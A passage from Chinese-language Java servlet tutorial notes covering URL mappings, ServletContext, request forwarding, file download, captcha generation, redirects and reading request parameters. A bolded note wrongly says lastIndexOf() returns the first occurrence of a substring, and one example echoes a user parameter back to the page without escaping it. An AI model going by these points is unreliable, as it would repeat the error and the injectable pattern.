class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>默认路径</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>举例：通过默认路径可以规定404页面</p><blockquote><p>前后缀映射</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml">前缀<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/a/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml">后缀<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.aaaaaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：后缀不能写为<code>/</code>开头的格式，例如<code>/*.mujie</code>，<code>/hi/*.aaa</code>等</p><p>​            前缀通配符前不能有字母如<code>/a*</code>等</p><h3 id="ServletContext对象"><a href="#ServletContext对象" class="headerlink" title="ServletContext对象"></a>ServletContext对象</h3><p>即Servlet上下文对象，同一项目中的多个Servlet之间是无法直接通信的，ServletContext就起到一个中间商的作用，通过它可以实现Serlvet之间的通信，它凌驾于所有Servlet之上且全局唯一</p><p><strong><img src="image-20210906204203965.png" alt="image-20210906204203965"></strong></p><h4 id="举例：ServletContext可以实现数据共享"><a href="#举例：ServletContext可以实现数据共享" class="headerlink" title="举例：ServletContext可以实现数据共享"></a>举例：ServletContext可以实现数据共享</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//HelloServlet</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//设置一个数据</span>    String name <span class="token operator">=</span> <span class="token string">"Mujie"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//将数据放入ServletContext，名字为a，值为name</span>    servletContext<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//ServletContexts</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    ServletContext servletContext <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String a <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> servletContext<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我是"</span><span class="token operator">+</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.atmujie.Servlet.HelloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>get<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.atmujie.Servlet.ServletContexts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>get<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/get<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210906211319296.png" alt="image-20210906211319296"></p><h4 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    ServletContext servletContext <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//请求转发</span>    servletContext<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210906213646722.png" alt="image-20210906213646722"></p><p>请求转发时路径不会变，以上面代码为例，转发只是将该路径<code>/hello</code>的资源拿过来</p><p>设客户端为A,请求页面为B,转发页面为C,请求转发和重定向的关系如图所示</p><p><img src="image-20210906214157695.png" alt="image-20210906214157695"></p><p>请求转发本质上A并没有拿到C,”请求”C的是B，与A无关，所以A请求的页面始终为B</p><h4 id="Properites-类"><a href="#Properites-类" class="headerlink" title="Properites 类"></a>Properites 类</h4><p>Properties 类位于 java.util.Properties ，是Java 语言的配置文件所使用的类， ==Xxx.properties 为Java 语言常见的配置文件==</p><p>数据库的配置 jdbc.properties, 系统参数配置 system.properties</p><blockquote><p>资源文件周知</p></blockquote><p>资源文件properites一般放在resource文件中</p><ul><li>java目录构建properties需要配置pom.xml中的build选项，否则Maven无法正常导出</li><li>在java和eresource目录下构建的properites文件都会被打包到classes路径下，我们俗称这个路径为classpath，即类路径</li></ul><p><img src="https://img-blog.csdnimg.cn/20190626193351419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly95dWVqbC5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70" alt="1. 构造方法"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取文件流  </span><span class="token comment" spellcheck="true">/*将资源作为流获取*/</span>    InputStream resourceAsStream <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/classes/db.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//路径也可以写为/resources/db.properties</span>    <span class="token comment" spellcheck="true">//new Properites</span>    Properties properites <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//使用pro类加载配置文件流</span>    properites<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>resourceAsStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取配置</span>    String name <span class="token operator">=</span> properites<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name:"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HttpServletResponse-与-HttpServletRequest"><a href="#HttpServletResponse-与-HttpServletRequest" class="headerlink" title="HttpServletResponse  与 HttpServletRequest"></a>HttpServletResponse  与 HttpServletRequest</h3><p><img src="image-20210907150032404.png" alt="image-20210907150032404"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//获取输出流，写一般流时使用</span>ServletOutputStream <span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//同样获取输出流，写中文时使用，其他流不建议使用，容易造成数据丢失</span>PrintWriter <span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还可以设置响应的请求头，状态码等</p><blockquote><p>常见应用</p></blockquote><ul><li>向浏览器中输出消息</li><li>下载文件</li></ul><h4 id="Response-下载文件"><a href="#Response-下载文件" class="headerlink" title="Response 下载文件"></a>Response 下载文件</h4><p><img src="image-20210907152617222.png" alt="image-20210907152617222"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Response</span>响应 <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取文件路径</span>        String path <span class="token operator">=</span> <span class="token string">"C:\\Users\\MuJie\\Downloads\\google\\测试.txt"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置下载文件名</span>        String fileName <span class="token operator">=</span> <span class="token string">"1.txt"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回浏览器下载请求</span>        resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;fileName="</span><span class="token operator">+</span> URLEncoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//把文件变成文件流</span>        FileInputStream fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//创建缓冲区</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取输出流</span>        ServletOutputStream outputStream <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将文件流写入输出流</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            outputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//关闭流</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取的文件路径和文件名我上面是手写的，但实际开发中显然并不适用，所以再写一个实时获取</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*通过ServletContext定位文件相对路径*/</span>String path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"/resources/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置下载文件名</span>String fileName <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：</p></blockquote><ul><li><p>在使用ServletContext.getRealPath() 时，传入的参数是从 当前servlet 部署在tomcat中的文件夹算起的相对路径，要以”/“ 开头，否则会找不到路径，导致NullPointerException</p></li><li><p><strong>read</strong>(byte[] b)这个方法是先规定一个数组长度，将这个流中的字节缓冲到数组b中，返回的这个数组中的字节个数，这个缓冲区没有满的话，则返回真实的字节个数，到未尾时都返回-1</p></li><li><p>是一个web应用对应一个ServletContext，所以ServletContext的作用范围是整个应用.ServletContext实例包含了所有servlet共享的资源信息。通过提供一组方法给servlet使用，用来和servlet容器通讯，比如获取文件的MIME类型、分发请求、记录日志等。<br>  这里需要注意一点，如果你的应用是分布式部署的，那么每台服务器实例上部署的应用实例都各自拥有一个ServletContext实例。</p></li><li><p><strong>lastIndexOf()方法的返回值是指定子字符串在字符串中第一次出现处的索引值。</strong></p></li><li><p>substring()方法根据指定索引截取字符串</p></li></ul><h4 id="Response-实现验证码"><a href="#Response-实现验证码" class="headerlink" title="Response  实现验证码"></a>Response  实现验证码</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//设置浏览器自动刷新</span>    resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"refresh"</span><span class="token punctuation">,</span><span class="token string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//在内存中创建一个图片</span>    BufferedImage bufferedImage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedImage</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> BufferedImage<span class="token punctuation">.</span>TYPE_3BYTE_BGR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取画笔对象</span>    Graphics2D graphics <span class="token operator">=</span> <span class="token punctuation">(</span>Graphics2D<span class="token punctuation">)</span> bufferedImage<span class="token punctuation">.</span><span class="token function">getGraphics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置图片背景颜色</span>    graphics<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>Color<span class="token punctuation">.</span>BLUE<span class="token punctuation">)</span><span class="token punctuation">;</span>    graphics<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//给图片写数据</span>    graphics<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>Color<span class="token punctuation">.</span>BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>    graphics<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Font</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span>Font<span class="token punctuation">.</span>BOLD<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    graphics<span class="token punctuation">.</span><span class="token function">drawString</span><span class="token punctuation">(</span><span class="token function">randomNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//告诉浏览器这是个图片</span>    resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//取消网站缓存</span>    resp<span class="token punctuation">.</span><span class="token function">setDateHeader</span><span class="token punctuation">(</span><span class="token string">"expires"</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span><span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Pragma"</span><span class="token punctuation">,</span><span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//将图片写给浏览器</span>    ImageIO<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bufferedImage<span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//验证码随机数</span><span class="token keyword">private</span> String <span class="token function">randomNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Random random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i1 <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String randNum <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span><span class="token punctuation">;</span>    StringBuffer stringBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> randNum<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        stringBuffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> stringBuffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> randNum<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意</p></blockquote><ul><li>String的值是不可变的，这就导致每次对String的操作都会生成新的String对象，不仅效率低下，而且浪费大量优先的内存空间<br>  StringBuffer是可变类，和线程安全的字符串操作类，任何对它指向的字符串的操作都不会产生新的对象。每个StringBuffer对象都有一定的缓冲区容量，当字符串大小没有超过容量时，不会分配新的容量，当字符串大小超过容量时，会自动增加容量<br>  <strong>简单来说，String定义之后不可修改，StringBuffer定义后可以像操作数组一样随意删减字符</strong></li><li>图片的宽高是从左上角为坐标原点，而文字是右下角</li></ul><h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><pre class="line-numbers language-java"><code class="language-java">resp<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"项目路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重定向不同于请求转发，重定向页面跳转url会发生变化</p><blockquote><p>原理</p></blockquote><pre class="line-numbers language-java"><code class="language-java">resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span><span class="token string">"项目路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Request-获取参数"><a href="#Request-获取参数" class="headerlink" title="Request 获取参数"></a>Request 获取参数</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-jsp"><code 